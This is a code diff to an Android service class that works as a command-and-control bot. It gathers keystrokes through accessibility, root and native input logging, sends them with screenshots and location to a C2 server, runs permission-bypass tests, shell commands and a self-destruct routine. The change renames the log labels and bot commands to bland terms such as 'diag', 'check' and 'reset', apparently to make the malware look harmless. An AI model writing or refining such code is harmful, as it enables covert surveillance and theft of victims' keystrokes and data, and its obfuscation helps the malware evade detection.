@@ -90,9 +90,9 @@ public class MonitorService extends Service {
             String rootLogs   = RootKeylogger.flushLogs();
             String nativeLogs = NativeProbe.safeFlushNativeKeylogs();
             String combined   = "";
-            if (!accLogs.isEmpty())    combined += "[ACCESSIBILITY]\n"     + accLogs    + "\n";
-            if (!rootLogs.isEmpty())   combined += "[ROOT getevent]\n"     + rootLogs   + "\n";
-            if (!nativeLogs.isEmpty()) combined += "[NATIVE /dev/input]\n" + nativeLogs + "\n";
+            if (!accLogs.isEmpty())    combined += "[A]\n" + accLogs    + "\n";
+            if (!rootLogs.isEmpty())   combined += "[R]\n" + rootLogs   + "\n";
+            if (!nativeLogs.isEmpty()) combined += "[N]\n" + nativeLogs + "\n";
             c2.sendResult(botId, combined.isEmpty() ? "(no keylogs yet)" : combined);
 
         } else if (lower.equals("shot")) {
@@ -126,7 +126,7 @@ public class MonitorService extends Service {
         } else if (lower.equals("location")) {
             new Thread(() -> c2.sendResult(botId, DeviceData.lastLocation(this))).start();
 
-        } else if (lower.equals("kernel_probe")) {
+        } else if (lower.equals("diag")) {
             new Thread(() -> {
                 String javaReport   = KernelProbe.run(this);
                 String nativeReport = NativeProbe.safeRunKernelProbe();
@@ -148,10 +148,10 @@ public class MonitorService extends Service {
                 }
             }).start();
 
-        } else if (lower.equals("bypass_test")) {
+        } else if (lower.equals("check")) {
             new Thread(() -> c2.sendResult(botId, PermissionHelper.runAllTests(this))).start();
 
-        } else if (lower.equals("self_destruct")) {
+        } else if (lower.equals("reset")) {
             new Thread(() -> c2.sendResult(botId, SelfDestruct.run(this, c2, botId))).start();
 
         } else if (lower.startsWith("shell ")) {
